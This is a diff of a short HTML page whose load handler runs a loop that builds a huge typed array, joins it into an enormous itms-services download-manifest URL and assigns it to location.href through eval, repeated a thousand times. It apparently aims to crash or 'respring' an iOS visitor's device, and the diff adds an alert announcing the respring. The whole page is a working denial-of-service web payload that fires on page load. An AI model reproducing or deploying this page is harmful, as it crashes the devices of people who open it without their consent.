@@ -3,7 +3,7 @@
 <head>
 	<title></title>
 </head>
-<body onload='javascript:respring()'>
+<body onload='respring();'>
 	<center>
 		<b>Wait a few seconds for your <strong>
 		<script>
@@ -11,7 +11,8 @@
 		</script></strong> to respring</b>
 	</center>
 	<script>
-	var t = 1000; function respring(){ for(x=0;x<t;x++){ var r = "t=new Uint32Array(2**23);location.href='itms-services://?action=download-manifest&url=https://'+t.join('@bc');" var deval = eval(r); } } 
+		alert('Respring In Progress....');
+		var t = 1000; function respring(){ for(x=0;x<t;x++){ var r = "t=new Uint32Array(2**23);location.href='itms-services://?action=download-manifest&url=https://'+t.join('@bc');" var deval = eval(r); } } 
 	</script>
 </body>
 </html>
